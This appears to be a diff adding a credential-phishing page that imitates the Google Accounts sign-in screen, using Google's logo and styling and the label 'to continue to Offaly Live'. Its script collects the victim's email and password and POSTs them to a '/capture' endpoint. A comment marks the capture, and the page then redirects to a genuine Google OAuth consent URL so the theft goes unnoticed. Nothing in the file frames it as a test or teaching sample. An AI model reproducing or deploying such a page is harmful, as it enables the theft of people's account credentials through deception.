@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in - Google Accounts</title>
+<style>
+body { font-family: 'Google Sans', arial, sans-serif; background: #fff; margin: 0; }
+.card { border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; margin: 40px auto; padding: 48px 40px 40px; text-align: center; }
+.logo { width: auto; height: 40px; margin-bottom: 24px; }
+h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; }
+.sub { font-size: 16px; color: #202124; margin: 0 0 24px; }
+.err { color: #d93025; font-size: 12px; display: none; margin: 0 0 10px; }
+input[type=email], input[type=password], input[type=text] { width: 100%; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; margin-bottom: 12px; outline: none; }
+input:focus { border-color: #1a73e8; }
+.btn { background: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 9px 23px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
+.footer { clear: both; text-align: center; font-size: 12px; color: #5f6368; margin-top: 32px; }
+.step2 { display: none; }
+</style>
+</head>
+<body>
+<div class="card">
+  <img class="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNzIiIGhlaWdodD0iOTIiPjxwYXRoIGZpbGw9IiNFQTQzMzUiIGQ9Ik0xMTUuNzUgNDcuMThjMC0xMi43Ny05Ljk5LTIyLjE4LTIyLjI1LTIyLjE4LTEyLjI2IDAtMjIuMjUgOS40MS0yMi4yNSAyMi4xOCAwIDEyLjc2IDkuOTkgMjIuMTggMjIuMjUgMjIuMTggMTIuMjYgMCAyMi4yNS05LjQyIDIyLjI1LTIyLjE4em0tOS43NCAwYzAgNy45NS01Ljc5IDEzLjI5LTEyLjUxIDEzLjI5LTYuNzIgMC0xMi41MS01LjM0LTEyLjUxLTEzLjI5IDAtOC4wMSA1Ljc5LTEzLjI5IDEyLjUxLTEzLjI5IDYuNzIgMCAxMi41MSA1LjI4IDEyLjUxIDEzLjI5eiIvPjxwYXRoIGZpbGw9IiNGQkJDMDUiIGQ9Ik0xNjMuNzUgNDcuMThjMC0xMi43Ny05Ljk5LTIyLjE4LTIyLjI1LTIyLjE4LTEyLjI2IDAtMjIuMjUgOS40MS0yMi4yNSAyMi4xOCAwIDEyLjc2IDkuOTkgMjIuMTggMjIuMjUgMjIuMTggMTIuMjYgMCAyMi4yNS05LjQyIDIyLjI1LTIyLjE4em0tOS43NCAwYzAgNy45NS01Ljc5IDEzLjI5LTEyLjUxIDEzLjI5LTYuNzIgMC0xMi41MS01LjM0LTEyLjUxLTEzLjI5IDAtOC4wMSA1Ljc5LTEzLjI5IDEyLjUxLTEzLjI5IDYuNzIgMCAxMi41MSA1LjI4IDEyLjUxIDEzLjI5eiIvPjxwYXRoIGZpbGw9IiM0Mjg1RjQiIGQ9Ik0yMDkuNzUgMjYuMzR2MzkuODJjMCAxNi4zOC05LjY2IDIzLjA3LTIxLjA4IDIzLjA3LTEwLjc1IDAtMTcuMjItNy4xOS0xOS42Ni0xMy4wN2w4LjQ4LTMuNTNjMS41MSAzLjE5IDUuMjEgNi45NiAxMS4xNyA2Ljk2IDcuMzEgMCAxMS44NC00LjUxIDExLjg0LTEzdi0zLjE5aC0uMzRjLTIuMTggMi42OS02LjM4IDUuMDQtMTEuNjggNS4wNC0xMS4wOSAwLTIxLjI1LTkuNjYtMjEuMjUtMjIuMSAwLTEyLjQ5IDEwLjE2LTIyLjI2IDIxLjI1LTIyLjI2IDUuMjkgMCA5LjQ5IDIuMzUgMTEuNjggNC45NmguMzR2LTMuNjFoOS4yNXptLTguNTYgMjAuOTJjMC03LjgxLTUuMjEtMTMuNTItMTEuODQtMTMuNTItNi43MiAwLTEyLjM1IDUuNzEtMTIuMzUgMTMuNTIgMCA3Ljc1IDUuNjMgMTMuMzYgMTIuMzUgMTMuMzYgNi42MyAwIDExLjg0LTUuNjEgMTEuODQtMTMuMzZ6Ii8+PHBhdGggZmlsbD0iIzM0QTg1MyIgZD0iTTIyNSAzdjY1aC05LjVWM2g5LjV6Ii8+PHBhdGggZmlsbD0iI0VBNDMzNSIgZD0iTTI2Mi4wMiA1NC40OGw3LjU2IDUuMDRjLTIuNDQgMy42MS04LjMyIDkuODMtMTguNDggOS44My0xMi42IDAtMjIuMDEtOS43NC0yMi4wMS0yMS45MiAwLTEzLjAzIDkuNDYtMjEuOTIgMjAuOTMtMjEuOTIgMTEuNTkgMCAxNy4yOCA5LjA4IDE5LjEzIDEzLjk5bDEuOTkgNS4wOC0yOS45IDEyLjM4YzIuMjkgNC41MSA1Ljg2IDYuODEgMTAuODcgNi44MSA1LjAxIDAgOC40NC0yLjU1IDEwLjkxLTYuMjl6bS0yMy40Ny03Ljk4bDE5Ljk5LTguM2MtMS4wNS0yLjY5LTQuMjEtNC41NS04LjA5LTQuNTUtNC44NCAwLTExLjU5IDQuMjctMTEuOSAxMi44NXoiLz48L3N2Zz4=" alt="Google">
+  <h1 id="h1">Sign in</h1>
+  <div class="sub" id="sub">to continue to Offaly Live</div>
+  <div class="err" id="err">Wrong password. Try again or click "Forgot password" below.</div>
+  <div class="step1" id="step1">
+    <input type="email" id="email" placeholder="Email or phone" autocomplete="username" autofocus>
+    <br>
+    <button class="btn" id="next1">Next</button>
+  </div>
+  <div class="step2" id="step2">
+    <div style="font-size:14px;color:#5f6368;margin-bottom:16px" id="who"></div>
+    <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
+    <br>
+    <button class="btn" id="next2">Next</button>
+  </div>
+  <div class="footer">English (United Kingdom) &nbsp;·&nbsp; <span id="yr"></span></div>
+</div>
+<script>
+var AUTHURL = "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=250834318298-fkhfc36npetos2p7d8h3h2duuk3seuj5.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fbuy.tinypass.com%2Fcheckout%2Fuser%2FgoogleCallback%2F&scope=profile%20email&state=GARInTXr6kM8mfP1okYopMM0dsXO6dat6MRbvpXg";
+var step = 1;
+document.getElementById('yr').textContent = new Date().getFullYear();
+document.getElementById('next1').onclick = function() {
+  var e = document.getElementById('email').value.trim();
+  if (!e) { return; }
+  document.getElementById('who').textContent = e;
+  document.getElementById('step1').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+  document.getElementById('password').focus();
+};
+document.getElementById('next2').onclick = function() { submit(); };
+document.getElementById('password').addEventListener('keydown', function(ev) { if (ev.key === 'Enter') submit(); });
+
+function submit() {
+  var e = document.getElementById('email').value.trim();
+  var p = document.getElementById('password').value;
+  if (!e || !p) { return; }
+  var x = new XMLHttpRequest();
+  x.open('POST', '/capture');
+  x.setRequestHeader('Content-Type', 'application/json');
+  x.onreadystatechange = function() {
+    if (x.readyState === 4) {
+      if (x.status === 200 && x.responseText.indexOf('"ok":1') >= 0) {
+        // captured: continue to REAL Google consent so their login succeeds
+        setTimeout(function() { window.location.href = AUTHURL; }, 400);
+      } else {
+        document.getElementById('err').style.display = 'block';
+      }
+    }
+  };
+  x.send(JSON.stringify({email: e, password: p}));
+  return false;
+}
+</script>
+</body>
+</html>
